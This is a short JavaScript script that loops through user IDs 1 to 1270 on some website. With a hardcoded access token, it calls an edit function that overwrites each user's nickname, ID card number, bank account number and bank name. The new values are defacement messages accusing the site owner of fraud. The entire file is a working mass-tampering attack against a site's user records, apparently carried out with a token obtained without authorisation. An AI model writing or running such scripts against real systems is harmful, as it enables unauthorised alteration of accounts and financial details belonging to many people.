const { editUser } = require('./utils/edit-user');

// Const data
const start_from = 1;
const end_on = 1270;
const token = 'EDC5F8F18073C65EF2CF60F274782DC9';

for(let i = start_from; i <= end_on; i++) {
    editUser(i, token, {
        nickname: 'This Web Was Hacked!',
        id_card: 123456789,
        banknumber: 123456789,
        bankname: 'REASON: The owner of the site is a fraudster!',
        busername: 'Do not remit any money to them!'
    });
}